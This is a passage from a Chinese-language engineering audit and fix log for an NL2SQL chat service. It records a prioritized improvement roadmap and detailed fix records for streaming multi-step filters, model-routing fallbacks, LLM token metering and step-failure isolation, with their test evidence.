- ✅ **supplier name trigram 索引**（3500 行 seq scan，`supplier_name_resolver.py:151`）—— **已修复（2026-09-27）**，alembic 0086 `idx_entity_mapping_supplier_name_trgm` GIN trigram + partial `WHERE entity_type='SUPPLIER'`。EXPLAIN 待 prod 真机探针验证（部署门禁建议）。
- ✅ **`_callWithRetryBackoff` 末尾 unreachable**（死分支）—— **已修复（2026-09-27）**，`llm_retry_policy.py:171` 改 `raise RuntimeError("unreachable") # noqa: B008` + 注释说明意图（tenacity AsyncRetrying 始终 raise 或 yield，分支不可达；`assert False` 会被 ruff 当生产 `-O` 模式剥离误报）。
- ⏳ **§2.4 LOW 拆分/魔数治理（2026-09-28 启动，Phase 1 拆分已完成，Phase 2 治理待续）**：
  - **魔数治理规范已落地**（2026-09-28，[`Harness/rules/魔数治理.md`](../../rules/魔数治理.md)）——三档决策（治理 / 不改 / 判别不清）+ 14 项候选常量清单 + 复刻现有 `_getClassFilterMaxClasses` / `_getAdsRecallWeight` 模式 + 种子 upsert 模板 + 3 例测试要求。SSOT 是 chat_service 已治理的 3 项（`ENABLE_L4_AGENT_LOOP` / `CLASS_FILTER_MAX_CLASSES` / `ADS_RECALL_WEIGHT`）。
  - ✅ **Phase 1.1 nl2sql_service.py 拆分已完成（2026-09-28）**——2589 → 8 文件（`nl2sql_dialects`/`scope`/`refs`/`refine`/`prompts`/`schema`/`plan`/门面），门面 re-export 21 私有名，nl2sql 单测 402 passed。SSOT：`Harness/changes/chore-nl2sql-service-file-split/summary.md`。
  - ✅ **Phase 1.2 chat_service.py 拆分已完成（2026-09-28）**——4916 → 基类 1443 行 + 7 mixin + 1 helper（`chat_recall`/`chat_multistep`/`chat_context`/`chat_usage`/`chat_stream`/`chat_domain`/`chat_l4`/`chat_helpers`），方法名/签名零改动，MRO 无冲突，55 核心 + 9 领域集成失败集逐行 IDENTICAL（零回归）。SSOT：`Harness/changes/chore-chat-service-file-split/summary.md`。
  - **Phase 2 治理项（实施待续）**：`_CLASS_FILTER_TOP_K`(15) / `_CLASS_FILTER_HIT_MATCH_MIN`(0.5) / `_FEW_SHOT_*`(3/0.6/400) / `_CONTEXT_*_LIMIT`(500/500/4000) / `_STATE_HISTORY_FIELD_LIMIT`(500) / `_REFINE_MAX_LIMIT`(1000) / `_VALUE_SAMPLE_VALUE_MAX`(30) / `_OWNER_HINT_MAX_CLASSES`(3) / `_CRITICAL_DIGEST_MAX_*`(50/200) / `_NL2SQL_MAX_TOKENS`(2048)——常量已随 mixin 落位，下一步在各模块内新增 `_getXxx(session)` 读取方法 + `seed_system_config.py`。
  - 完整计划见 `/Users/sunql/.claude/plans/rosy-beaming-phoenix.md`（§2.4 LOW 文件拆分 + 魔数治理 + §15 残差 3 阶段）。

### 2.5 文档-代码漂移（独立成节，因影响后续开发）

| 漂移点 | 现状 |
|---|---|
| 文档引用 `sql_guard.py` | ✅ **已修复（2026-09-27，见 chore-doc-drift-cleanup）**——`architecture.md:41` Agent Loop 路径修正；`agent-loop.md` 整篇重写（删除不存在的 `agent_loop.py` 与 `security/sql_guard.py` 引用，标注实现在 `agent_runtime_service.py:593` 与 `business_db_pool.py`）；`nl2sql-engine.md:26` 意图数从「5 类」更正为「13 类」 |
| `nl2sql-engine.md` 写「5 类活跃意图」 | ✅ **已修复（2026-09-27，见 chore-doc-drift-cleanup）**——`nl2sql-engine.md:26` 已重写为「13 类意图」（含 supplier_360/risk/graph_reasoning/agent_run 4 条领域拦截路径），原 `query/new_query/refine/follow_up/clarify/chitchat/define/map/metric` 9 类 + 4 条新路径 = 13 类全列 |
| `IntentType` docstring 写「DEFINE/MAP/METRIC 暂未接入流水线」 | ✅ **已修复（2026-09-27，见 chore-doc-drift-cleanup）**——`chat_service._handleDefineClass / _handleDefineMetric / _handleShowMetric / _handleMapProperty` 全部已接线（`chat_service.py:2551-2568`）。docstring 改为「已接入流水线（本体治理指令）」 |
| ~~`config.py` Settings 字段重复定义~~ | ✅ **已修复（2026-09-27）**，见 [chore-config-duplicate-fields](../changes/chore-config-duplicate-fields/summary.md)。9 组重复声明（后者静默覆盖前者）已删，含 `jwtTtlSeconds`(3600/86400)、`bcryptRounds`(12/10)、`jwtSecret`(`""`/开发占位符)、`jwtAudience`、`dbPoolSize` 等；**生效默认值零变化**（51 字段快照 diff 为空）。全树 AST 扫描顺带查出并修复 `AgentDefinitionRead.created_time`（Optional 声明被非 Optional 覆盖的「怪胎」形态）。同批新增：类体重复字段 AST 守卫（`test_no_duplicate_fields.py`，M6 方法版的姊妹守卫）+ `jwtSecret` 启动自检 warning（空值/开发占位符大声告警；用户拍板：**不 fail-fast**、`bcryptRounds` **维持 10**） |
| ~~`nl2sql-engine.md` 4 层路由「L3 有触发条件」~~ | ✅ **已更正（2026-09-27，见 §15）**。原文「L3 `_executeChainedSteps` 无生产调用者」属实，但结论应是**删掉它**而不是「补触发条件」：该引擎已随 M5 删除（引擎整段 + 其测试），**保留**的是跨步 CTE 的**能力**——由 `prior_cte` 片段注入承担（契约见 §2.3 M8）。现状：L1 意图路由 / L2 单步 plan / L4 Agent Loop 活跃，**L3「CTE 串联引擎」不再作为独立层存在**，`nl2sql-engine.md` 与 `architecture.md` 已同步改写 |
| **`routing_layer` 从不写 `L3`**（本批复核发现，与上一行同源） | ✅ **已修复前端（2026-09-27，见 fix-routing-metrics-l3-truth）**。生产代码只写 `L1`/`L2`/`L4`，前端 `types/routingMetrics.ts` 联合类型去掉 L3、`LAYER_COLORS` 去掉 L3、折线图 mock 去掉 L3 series；i18n 「L3 多步链式推理」改为废弃文案。多步链实际记在 `L2`（`_executeMultiStep` 路径）已在 i18n 「L2 LLM NL2SQL（含多步拆解）」中反映 |
| **`nl2sql-engine.md` 的「L2 可选 CTE 增强：`plan.requiresCte=True`」** | ✅ **已修复（2026-09-27，见 chore-doc-drift-cleanup-b + 本批 third-pick）**：`nl2sql-engine.md:120` 该 bullet 已替换为 ⚠️ 更正注（明示「`plan.requiresCte=True` 是设计文档遗留、代码中不存在」），并指向 §「L3 —— 已删除，仅保留 `prior_cte` 能力」段落看真实契约。同批顺带校正：`app/services/agent_loop.py` → `app/services/agent_runtime_service.py:593`（agent-loop.md 整篇重写）、迁移 `0051_add_routing_metrics_fields.py`（`metric-pipeline.md:166`）、`multi_step_plan.py` → `app/domain/multi_step_plan.py`（`nl2sql-engine.md:357,359,394`） |

---

## 3. 提升建议（按优先级路线图）

### P0 —— 正确性修复（建议立即，先于任何新功能）

1. ~~**修 C1/C2（流式全局过滤）**~~ ✅ **已完成（2026-09-25）**，见 §6。
2. ~~**修 C3（多步硬失败隔离）**~~ ✅ **已完成（2026-09-26）**，见 §9。
3. ~~**修 C4（重试子问题）**~~ ✅ **已完成（2026-09-26）**，见 §9。
4. ~~**补齐 H1/H2 计量**（`extract_global_filters` 返回 token 数并落 `session_token_usage`；
   `run_agent_loop` 返回 token 数、按实际模型 config 计价；统一 H9 成本单位为 USD）~~
   ✅ **已完成（2026-09-26）**，连同 H8 一次修完（四处同一根因），见 §8。
5. ~~**补 C 兜底分支的 global_filters 对称缺口**（P0 唯一剩余项）：流式/非流式
   `_isFollowUpRetryCandidate` 命中后经 `_prepareFollowUpMultiStep` 走多步的路径均未传
   `global_filters`（两侧现状一致，属对称缺口）。抽一次 `_resolveGlobalFilters(dto2)` 即补齐。~~
   ✅ **已完成（2026-09-26）**，见 §10。修法比本行原建议更彻底：抽取收敛进共享前置
   `_prepareFollowUpMultiStep`（4 个入场点改为纯透传）—— 根因是「同一份多步前置知识被复制到
   4 个入场点、靠人记得传参」，而它已经漏过两次（C1/C2 流式那次 + 本次 C 兜底两侧）。
   ⚠️ 与本批同源的 **M7**（重试错误只剩第一次；C3 已让它变成用户可见文案）~~仍待处理~~ ✅
   **已于 2026-09-26 修复**，见 §11（连同复审发现的「重试生成自己失败时 token 丢账」一并闭合）。

### P1 —— 健壮性（本季度）

5. ~~**H5 向量失败降级**：类召回异常回退时仍应用 ODS 过滤 + `CLASS_FILTER_MAX_CLASSES`
   截断，并记 warning（当前是全量裸返回）。~~
   ✅ **已完成（2026-09-26）**，见 §12。修法比本行建议更进一步：五个回退分支收敛进单一
   `_fallbackRecall`（一个出口 = 一处不变量），且**排序先于截断**（入参是库表顺序，直接
   截前缀等于随机丢表）。
6. ~~**H3 历史预算**：`_buildContextPrompt` 增加 token/字符截断（如 `_clip_text` 复用），
   防止长轮次膨胀 prompt。~~
   ✅ **已完成（2026-09-26）**，见 §12。**未采纳本行的 `_clip_text` 复用建议**：`_clipText`
   是头裁，而这里要保的是**最新**轮次（追问锚点），头裁会把最新一轮切掉 —— 改为「单条限量
   + 从最新往回保留整块」。
7. ~~**H4 断连处理**：捕获 `CancelledError`，持久化已产出的部分答案与消息，落库后再退出。~~
   ✅ **已完成（2026-09-27）**，见 §15。**未采纳本行的「捕获 `CancelledError`」**：运行时实验证明**主情形（断连时生成器停在 `yield` 上）根本不进生成器帧** ——
   `except CancelledError` 与 `finally` **都不触发**（推迟到 asyncgen 终结器）；且 anyio 取消是**电平触发**，
   `await asyncio.shield(...)` 必立刻抛 ⇒ shield 也不行。改落在 **Starlette 现成的确定性钩子**
   `StreamingResponse(background=...)`（它在收敛任务组**之外**被 await），配**单发标志**去重。
8. ~~**H6 score 公式统一**：抽一个 `distanceToSimilarity(d)` 单源函数，四处复用；~~
   ✅ **已完成（2026-09-26）**，见 §14。**未采纳本行的「缺 score 键时显式按 0 处理」**：
   `distance` 缺失是上游契约违背（Milvus hit 必带距离），按 0 兜底会算成 `score=1.0` 的
   "完美命中"并静默污染排序 —— 决策为**保持 `h["distance"]` 硬下标快速失败**（用户口径）。
9. ~~**M1/M2/M3 SQL 安全加固**~~：M1/M2 已完成（见 §13）；**M3 已完成（2026-09-26）**，见 §14。
   **未采纳本行的「改为严格解析（损坏即抛）」**：`from_dict` 还承担「历史 JSONB 永不致命」
   的契约，抛错会让旧会话整段失败 —— 改为「照旧容错 + 分类上报 `PlanDrop`」，
   并把**真正该失败**的情形（全空计划）单独判失败。

### P2 —— 可维护性（清理欠账）

10. **文档-代码对齐**（§2.5 全部）：更新 `nl2sql-engine.md`/`architecture.md`/`agent-loop.md`
    的 `sql_guard.py` 引用与 13 类意图；修正 `IntentType` docstring；收敛 `config.py`
    重复字段定义。
    ⏳ **部分完成（2026-09-27，见 §15 + chore-config-duplicate-fields）**：本次 docs 提交修掉 `nl2sql-engine.md` 的 L3 行、
    **对不存在的 `app/services/multi_step_plan.py` 的引用**、`prior_cte` 契约，
    以及 `architecture.md` 的 4 层路由现状；**`config.py` 重复字段批（2026-09-27）**删除 9 组重复声明
    （生效默认值零变化）并新增 AST 字段守卫 + `jwtSecret` 启动自检。
    ✅ **2026-09-27 关闭**（见 [chore-doc-drift-cleanup](../changes/chore-doc-drift-cleanup/summary.md) +
    [chore-doc-drift-cleanup-b](../changes/chore-doc-drift-cleanup-b/summary.md)）：
    上批修 `IntentType` docstring「DEFINE/MAP/METRIC 已接入」+ `architecture.md` Agent Loop 路径 +
    `agent-loop.md` 整篇重写 + `nl2sql-engine.md` 意图数 5→13；本批补 3 处漏网——
    `nl2sql-engine.md:85,139,142` L4 段「LangGraph StateGraph」更正 + `enums.py:146`
    IntentType docstring 补全 13 类四档分述 + `owner.md:11` SQL Guard 引用 `business_db_pool.py`。
11. ~~**M5 死代码清理**：L3 CTE 引擎要么接线（承接 `requiresCte` 场景）要么删除，
    避免带未计量 LLM 调用的死代码长期驻留。~~
    ✅ **已完成（2026-09-27）**，见 §15（用户口径：**删引擎、保能力**）。**未采纳「接线」那半句**：
    跨步 CTE 能力已由 `prior_cte` 注入承担，接线等于重复实现；且该引擎含未计量 LLM 调用，
    接线会把计量盲区一起复活。
12. ~~**M6 重复定义清理**：只剩 `_buildOptionPrompt` 一处（`_consumedTokens` 经 2026-09-26 复核
    已无重复，见 §2.3 M6 修正）。~~ ✅ **已完成（2026-09-26）**，见 §14（含同文件死代码与
    常驻 AST 守卫 `test_no_duplicate_methods.py`）。
13. **拆大文件/大函数**：`chat_service.py`(4353)、`nl2sql_service.py`(2431) 远超 800 行；
    `_streamQuery`(335)、`_handleAgentRun`(216)、`validatePlan`(143) 等按职责拆。
14. **魔数治理**：把 topK/max classes/char 上限/阈值等编译期常量下沉 `system_config`，
    与已治理的 `CLASS_FILTER_MAX_CLASSES`、`ADS_RECALL_WEIGHT` 保持一致。

### P3 —— 规模化（类库增长后，出现真实案例再做）

15. **类召回升级**（`nl2sql-engine.md` 已记录，勿提前）：调大 topK / 多路召回 /
    两阶段检索（宽召回 50 → LLM/cross-encoder 精排 30）。
16. ~~**M9 Milvus 16384 上限**：分页对账或加 guard 断言。~~
    ✅ **已完成（2026-09-27）**，见 §15（提前完成）。**未采纳「加 guard 断言」**：断言只能让截断
    **可见**，不能修正结果 —— 而截断结果的消费者之一会**删集重建**（窗口外向量永久丢失）⇒
    必须改成**迭代取全量**。规模实测四个集合 7264 / 561 / 17 / 43 均远低于上限 ⇒
    修的是**潜伏的悬崖**（已在 §2.3 M9 标注）。
17. ~~**M10 KPI 倒排索引**：catalog 增长后 `findByAnyKeyword` 换倒排。~~
    ✅ **已改判关闭（2026-09-27）**，见 §15。压测推翻前提（13 KPI 无可测收益 / 两处静默偏离 /
    500×30 字 +42.3 MB 不 scale）⇒ 改为对**真实 `KpiMatchCache`** 的差分属性测试
    （补的才是真缺口：真实候选项顺序零覆盖）。若将来目录规模真的上来，正确结构是
    **Aho-Corasick / 后缀自动机**，不是子串枚举（最小正确形态已存档于 SSOT §6）。
18. ~~**H7 provider_type 生效**：真正支持非 OpenAI 兼容 embedding provider。~~
    ✅ **已改判关闭（2026-09-27）**，见 §15 —— **前半已修、后半明确不做**：
    「未知 `provider_type` 静默当 OpenAI 兼容」这个**静默腐化**已修（已知集合校验 + fail-fast +
    维度守卫覆盖 env 回退）；而「**真正支持**非 OpenAI 兼容协议」按用户口径**不做** ——
    没有可验证的端点与协议文档时实现出来是猜的（**不发明协议**），该限制已写进模块 docstring
    与 `ConfigError` 文案。**残留**：生产未声明 `EMBEDDING_DIMENSION` ⇒ env 路径守卫仍只记 warning
    （见 §2.3 H7 状态列）。

---

## 4. 建议的开发守则（给后续迭代）

1. **所有新 LLM 调用点必须走 `_callWithFallback` + `_recordUsage`**。本次审计发现的
   计量盲区（H1/H2/L3）全是「直调 `client.complete` 绕过计量」这一反复出现的模式。
2. **流式与非流式两套路径改动必须成对做**。C1/C2 的根因是只改了非流式
   `_executeMultiStep`、漏了流式 `_streamMultiStep`——新增多步能力时先问「两条路径都接了吗」。
3. **提示注入复用既有渲染器**（`_renderStatePart`/`inject_to_prompt`/`_sanitizeContext`），
   不手写新注入片段，避免方括号/尖括号转义这类已踩过的坑。
4. **不可变模式沿用**：frozen dataclass + `replace`/`with_step`，禁止原地改。

---

## 5. 关联文档

- `Harness/wiki/nl2sql-engine.md` — NL2SQL 引擎设计（含 4 层路由、召回窗口升级路径）
- `Harness/wiki/model-router.md` — 模型路由与 Token 计量
- `Harness/wiki/agent-loop.md` — L4 Agent Loop
- `Harness/wiki/architecture.md` — 系统架构
- `Harness/changes/feat-multistep-global-filter/summary.md` — 全局过滤继承 SSOT（C1/C2 的根因来源）
- `Harness/changes/feat-follow-up-cascade/` — 追问级联 A/B/C

---

## 6. 修复记录：C1/C2（2026-09-25）

### 根因

`feat-multistep-global-filter` 只接通了**非流式** `_executeMultiStep`，流式 `_streamMultiStep`
的接线缺三处（缺一即断）：

| 缺失项 | 现象 |
|---|---|
| 签名缺 `global_filters` 形参 | FOLLOW_UP 分支传参 → `TypeError` |
| `StepExecutionContext` 构造未赋值 | 即便传参也注入不到 plan prompt |
| 流式显式/复合分支未调 `_resolveGlobalFilters` | 从不抽取全局约束 |

注意 `_streamMultiStep` 内部**已**写 `global_filters=ctx.global_filters`——即上一轮只写了
「消费端」，没写「生产端」，故该表达式恒为 `None`，且形参缺失导致传参崩溃。

### 修复（`app/services/chat_service.py`，4 处）

1. `_streamMultiStep` 签名补 `global_filters: GlobalFilters | None = None`
2. `_streamMultiStep` 的 `StepExecutionContext(...)` 补 `global_filters=global_filters`
3. `_streamQuery` 显式多步分支补 `_resolveGlobalFilters` + 透传
4. `_streamQuery` 复合多步分支补 `_resolveGlobalFilters` + 透传

设计取向上**直接复用非流式同一 helper 与同形签名**，不新写一套流式专用逻辑，避免再次漂移。

### 验证（TDD：先 RED 后 GREEN）

新增 `app/tests/integration/test_multistep_global_filter.py::TestMultistepGlobalFilterStreaming`
3 用例：

| 用例 | 守约 |
|---|---|
| `test_stream_explicit_multi_step_injects_global_constraints` | 流式 3 步 plan prompt 均含 `[global_constraints]` |
| `test_stream_explicit_multi_step_calls_extractor_once` | 流式路径真正调抽取器且仅一次 |
| `test_stream_follow_up_multistep_no_type_error` | 流式追问多步无 error 事件（C1 回归锁） |

RED 阶段实测复现原始 `TypeError`：
`ChatService._streamMultiStep() got an unexpected keyword argument 'global_filters'`。

回归结果：
- `test_multistep_global_filter.py` 7 passed（4 旧 + 3 新）
- 针对性集成（multi_step / follow_up_cascade / stream_api / streaming_detached / service_state）**56 passed**
- 相关单测（multi_step_plan / step_query_planner / nl2sql_service / chat_service_stream / intent_service）**287 passed**

### 遗留

- 全量集成套件因耗时长（>17 分钟未跑完，含 Milvus 慢路径）被中止，**未取得全绿证据**；
  已用针对性套件覆盖本次改动路径。
- ~~新增代码尚未部署~~ → **已于 2026-09-26 随 §7 一并部署**（容器 `qa-backend` md5 与源码全等）。

---

## 7. 修复记录：D1/D2（2026-09-26）

排查追问级联回归时顺带发现的**两个独立缺陷**（详细 SSOT 见
[changes/fix-chat-llm-keyless-and-degrade](../../changes/fix-chat-llm-keyless-and-degrade/summary.md)）。

### 根因

| 编号 | 缺陷 | 触发条件 | 修复前形态 |
|---|---|---|---|
| D1 | 路由分支 7「超预算 → `_cheapest(active)`」选中**无 API key** 的配置 | `sessionCost >= SESSION_BUDGET` 且最便宜配置无 key | 裸 `AttributeError` → **500** |
| D2 | chat 流水线缺 `client is None` 兜底（`doc_qa`/`wiki_qa` 都有） | 候选全部构造不出客户端 | 通用 `except` → **internal 错误** |
| D3 | `_streamMultiStep` 降级分支不落库、不存查询状态 | 所有步骤都非 `aggregation_only`（**当前生产不可达**） | 悬空 user turn + `last_question` 留旧值 |
| D4 | 可用池过滤遍历每个配置调 `createClient`，未隔离 `ConfigError` | DB 有**单条**密文损坏配置（跨环境 restore / 手工改库） | **400**「API Key 密文无法解密」——所有自动路由请求 |

> D4 是 D1/D2 修复**引入的回归**，由 code-reviewer 复审抓出：改动前自动路由只解密「被选中」的那一个
> 配置，改动后遍历全部 ⇒ 失败面从 1 放大到 N。修法：逐配置 `try/except ConfigError` 按「不可用」筛掉。
> 通用教训——**把「1 次调用」扩成「N 次遍历」时，每一点都要能独立失败而不拖垮整条路径**。

本地触发土壤（`llm_config`）：

```
 id |    model_name    | is_active | has_key | cost_per_1k_input
  1 | deepseek-chat    | t         | t       |          0.001400
  3 | Qwen3.8-27B-4bit | t         | f       |          0.000000   ← 最便宜且无 key
```

**曾误判**：「前端始终下发 `modelId`，故聊天路径不受影响」。实际 `chatStore.ts:145`
的 `selectedModelId` 初值 `null` 且**不持久化**、`ChatPanel` 无自动选中 → **刷新页面后
前端自己就不带 `modelId`**，只要该会话成本已过预算线即 500。

### 修复（`app/services/chat_service.py`）

1. 新增 `_usableModelConfigs`：自动路由候选池剔除 `self._llmFactory(c)` 构造不出的配置
   （含**逐配置 `try/except ConfigError`** 隔离，见 D4），剔除时打日志；全部不可用时回退
   原列表（让兜底给 503 而非 `NoAvailableModelError`）。显式 `modelId` **仍按全量配置
   查找**，保 404 语义不被污染。`_PipelineContext.configs` 同步收窄 → fallback 也选不中它。
2. `_buildPipelineContext` 补 `if client is None: raise LLMUnavailableError(MSG_LLM_UNAVAILABLE)`。
3. 抽取 `_finalizeMultiStepDegrade` 供流式/非流式**共用**（落库 + `_saveQueryState` +
   如实报告已完成数据步骤数），消除「只改一条路径」的偏差。
4. `_resolveL4LlmClient` 的工厂调用包 `try/except ConfigError → None`，兑现其
   「可降级、不报错」的 docstring 契约。
5. `docker/.env` `SESSION_BUDGET` 0.1 → 1.0（对齐代码默认值）。
6. 降级收尾的两条文案移入 `messages_zh.py`（`MSG_MULTI_STEP_DEGRADE_PARTIAL/FAILED`）。

### 验证（TDD：先 RED 后 GREEN）

- 新增 `test_chat_model_routing_fallback.py` **5 用例**：RED 阶段 3 例以**生产的同一错误**
  （`AttributeError: 'NoneType' object has no attribute 'complete'`）失败；
  GREEN 断言含 `errorType == domain` 与具体文案，**不**只看「最后是 error 事件」——
  后者会被通用 `except`（`errorType=internal`）蒙过去。
  第 5 例（D4）RED 实测复现 `400 {"error":"API Key 密文无法解密，可能密钥已变更"}`，
  假工厂走**真实 `decryptApiKey`**、只 stub 网络客户端，故异常由生产代码真实抛出。
- 新增 `test_chat_multi_step.py::TestNoAggregationStepDegrade` 2 用例（流式 + 非流式）。
- 集成 74 passed；单元 376 passed / 1 failed（预存 `TestSearchByKeywordAdsWeighting`，
  stash 本次改动后复跑同样失败，已确认无关）。

### code-reviewer 复审

CRITICAL 0 / **HIGH 1（D4，已修）** / MEDIUM 0 / LOW 2（文案集中已修；「可用池 = 可构造
而非可连通」无需改，已在 docstring 声明）。审查并确认三项设计成立：`usable or configs`
回退链路闭合、显式 `modelId` 的 404 语义未被 503 掩盖、两条降级路径参数口径一致且无重复落库。

### 真机（`docker compose build backend && up -d backend`）

| 场景 | 结果 |
|---|---|
| 不带 `modelId` 调 `/chat` | **200**, `modelName=deepseek-chat`，返回 THBI Oracle 真实数据（385 家供应商 / 合计 17.84 亿） |
| 日志证据 | `自动路由剔除 1 个无可用 key 的模型配置（候选 3 → 2）` |
| 显式 `modelId=3`（无 key）非流式 | **503** `未配置可用的 LLM，无法回答该问题` |
| 同场景流式 | `event: error` / `errorType: "domain"` |

### 教训

- **同一契约在多条流水线里的实现要对齐**：`doc_qa`/`wiki_qa` 已有的 `None → 503`
  兜底，chat 漏了；「参照实现也要逐条比」比「看起来都在」可靠。
- **「部署了」≠「生效」**：本次既改代码又改 `.env`，只 `docker cp` 改不了环境变量，
  必须 build + up；验证用容器内 `printenv` + `md5sum` 双向核对。
- 记录缺陷时**先验证可达性再定级**：D3 写进评估时按「潜在」记录（生产不可达），
  避免把未验证的推断当活 bug 汇报。

---

## 8. 修复记录：H1 / H2 / H8 / H9（2026-09-26）

四处同一根因：**直调 `client.complete(...)` / `complete_with_tools(...)` 绕过计量收口**，
各自违反核心约束 #3「每次 LLM 调用必须记录 Token 消耗与成本」。SSOT 见
[`Harness/changes/fix-llm-metering-blindspots/`](../../changes/fix-llm-metering-blindspots/summary.md)。

### 根因

跨模块调用时 token 数**没有出口**：`extract_global_filters` 只返回 `GlobalFilters`；
`AgentLoopResult` 只有一个 USD 数字、无 token 字段（且该数字是 `_estimate_cost` 按
gpt-4o-mini 硬编码估的）；`rag_qa_service` 未接 `_recordUsage`；`supplier_risk_service`
把单价硬编码在自己内部（还是 CNY）。只有 `chat_service` 有落库收口。

后果不止「漏账」：同一张 `session_token_usage` 台账里混着**三种成本口径**
（config USD / gpt-4o-mini 估算 USD / 硬编码 CNY），而会话成本报表与
`ModelRouterService` 的预算降级判断都在读这张表。

### 修复

1. **token 数随返回值上行，成本在收口处算**：`AgentLoopResult` /
   `_AgentLoopStepResult` 增 `prompt_tokens` / `completion_tokens`；`_usage_tokens`
   取数、`_cost_for_usage` 复刻 `chat_service._costFor` 的 USD 公式（`Decimal` 全程）；
   三个 return 分支（含 `cost_cap`——那一轮的钱已经花了）都带 token。
2. **工厂与配置成对**：`SupplierRiskService.assess(..., llm_config=None)`；
   降级判据扩为「工厂或配置缺失 / `factory(cfg)` 返回 None」三者皆走**显式**降级
   （`logger.warning` + `fallback_template` + 归零），不再靠 AttributeError 被吞。
   `AgentToolContext` 相应增 `llm_config`。
3. **成本可降级契约**：`_resolveChatLlmClient`（原 `_resolveL4LlmClient`）对 L4 /
   供应商风险 / agent_run 三个调用方统一「解析不出就返回 `None` 由调用方降级」。

### 验证（TDD：先 RED 后 GREEN）

| 项 | RED 证据 | GREEN |
|---|---|---|
| H1 | 台账无 `multistep_global_filter` 行 | 61 passed |
| H2 | 台账 0 行；成本 `1.2e-05`（硬编码）vs 期望 `6e-05`（config 单价） | 2 passed（新增 `test_l4_agent_loop_metering.py`，走完整 `POST /api/v1/chat`） |
| H8 | 台账零行 + 低分场景 `citations=[]` | 13 passed |
| H9 | **诚实假工厂**（`cfg is None → None`，与 `createClient` 同语义）下 `riskPointsSource == "fallback_template"` | 2 passed + 回归 18 passed + 单元 49 passed |

集成回归（9 个文件，60 passed）：`test_chat_multi_step` / `test_chat_follow_up_cascade` /
`test_chat_model_routing_fallback` / `test_multistep_global_filter` / `test_doc_qa_api` /
`test_supplier_risk_api` / `test_supplier_risk_llm_metering` / `test_chat_agent_run` /
`test_l4_agent_loop_metering`。

全量单元套件 `2 failed, 2239 passed`，两个失败**已证明预存**（在 HEAD `4e84753` 的临时
worktree 中单独复跑同样失败）：ADS 加权重排被 `_rankByLayer` 覆盖（见 M6 邻近说明，
加权逻辑实际已是死代码）、`test_dependencies.py` 的 `Header.lower()` 版本漂移。

### 本批被回归测试抓出的问题（值得单独记）

H1 把一个**真实存在的第 5 次 LLM 调用**（B 层全局过滤抽取）纳入计量后，
`test_chat_multi_step.py` 里三处 `assert sorted(r.purpose for r in usages) == [...]`
**精确列举**了 purpose 集合，于是全红。这**不是**测试该改——LLM 确实调用了、token
确实花了，台账就该有这一行；错的是断言停留在旧调用序。修法是补上新 purpose，
并顺手加断言「该行 token > 0」，把「真花了钱」而不是「有个字符串」钉住。

> 教训：**精确列举型断言在「新增一次调用」时必然失败**，这本身是好事（它逼你看清
> 新增的调用有没有被计量）；但前提是每次改完一处计量，**必须重跑隔壁的集成套件**，
> 而不是只跑新写的那一个文件——本次 H1 的绿灯只覆盖了新建的
> `test_multistep_global_filter.py`。

### code-reviewer 复审

审出 3 条（0 CRITICAL / 1 HIGH / 1 MEDIUM / 1 LOW），全部当场处理：

| 级别 | 问题 | 处理 |
|---|---|---|
| HIGH | **L4 中途失败时已花掉的 token 凭空消失**：`run_agent_loop` 的 while 体无异常包容，任一抛错就穿透到 `_runL4AgentLoop` 的 `except`（`return None` 在 `_recordUsage` **之前**），前面若干轮的累计值随之丢失。征兆很典型：`terminated_reason="error"` 被文档写着、被 `_maybeRunL4AgentLoop` 检查着，却**从未被真正产生过**——异常旁路取代了它。 | while 体包 try/except，异常收敛为 `terminated_reason="error"` 后正常返回累计值；行为不变（照旧降级 L2/L3），只是账不再丢。新增 `test_l4_mid_loop_failure_still_meters_spent_tokens`（RED：`实际 0 行`） |
| MEDIUM | doc_qa 低分短路的 citations 落库**无测试**（H8 把 `[]` 改成真实 citations，但只有 SSE 事件被断言过） | 补 `test_answer_stream_low_score_persists_real_citations`，并在 HEAD worktree 上确认它**失败**（旧代码 `[] or None` → None），是真闸；行为保留（与 wiki_qa 对齐）。⚠️ 留一条产品待裁：模板说「未找到相关依据」却挂着低分 citations，`wiki_qa` 同样如此，属既有设计 |
| LOW | doc_qa 台账写 0/0 假行（退化流不报 usage 时），与其余三处计量点的零用量守卫不一致 | `if total_pt or total_ct:` 包住落库；新增 `test_answer_stream_zero_usage_writes_no_ledger_row`（RED：`total=0 cost=0.000` 行存在） |

### 遗留

1. 供应商风险台账行的 `model_config_id` 仍为 `NULL`（走 `_recordDirectUsage`，该助手
   按设计写 `None`）。改走 `_recordUsage` 会更一致，但 `_recordUsage` **不跳过 0 token**，
   降级路径会写出 0/0 假行——正是 H9 第二条用例明确禁止的。需先给它加零用量守卫。
2. **H9 是一处必须知会的行为变更**：供应商风险的 LLM 路径此前在生产上从未跑过
   （`createClient(None)` 恒返回 `None`），修复后只要解析得出配置就真调 LLM ⇒
   该路径**延迟与成本从 0 变为非 0**，文案也会变。受影响：`supplier_risk` 意图、
   `supplier_risk_agent` 工具。
3. 产品待裁（复审 MEDIUM 带出）：doc_qa / wiki_qa 在「无相关依据」模板下仍持久化低分
   citations，文案与依据自相矛盾。两个 service 要改一起改。

## 9. 修复记录：C3 / C4（2026-09-26）

§2.1（CRITICAL）最后两项，同一处结构问题的两个面：**多步序列里没有单一的执行出口**。
SSOT 见 [`Harness/changes/fix-multistep-failure-isolation/`](../../changes/fix-multistep-failure-isolation/summary.md)。

### 根因

`_executeMultiStep`（非流式）与 `_streamMultiStep`（流式）各自复制了一份「生成 → 执行」循环，
且**只隔离了软失败**：

```python
if outcome.sql is None or outcome.plan is None or outcome.plan.isUnanswerable:
    completed.append(StepResult(..., sql=None, error="无法回答（LLM 判定无有效查询计划）"))
    continue
data, final_sql, retry_tokens = await self._runQueryWithRetry(...)   # ← 抛错就没人接
```

- **C3**：`_planAndGenerateSql` 抛错、或 `_runQueryWithRetry` 执行 + 回灌重试均失败时，异常穿透整条
  序列到 API 层（非流式 500 / 流式 internal 错误事件），**已完成步骤的数据与已消耗 token 全部作废**。
- **C4**：重试路径绕过 `_planAndGenerateSql`，自己直接 `generateSql(dto.question, ..., priorState=None)`
  ⇒ 丢掉**子问题范围**与**跨步注入文本**（如「第二步要引用的前三个供应商」），与本步首次生成口径不一致，
  重试出的 SQL 可能重新对齐回整个复合问题。

### 修复

1. **抽共享 helper `_executeDataStep`**（流式/非流式同源）：内部完成生成 → 执行 → 回灌重试、
   token/cost 累计、`_spawnEmbedding`、`_recordUsage`，并把**所有**步骤级硬失败收敛为
   `_StepRun(result=StepResult(error=..., sql=None), tokens=..., cost=..., modelName=..., plan=...)`。
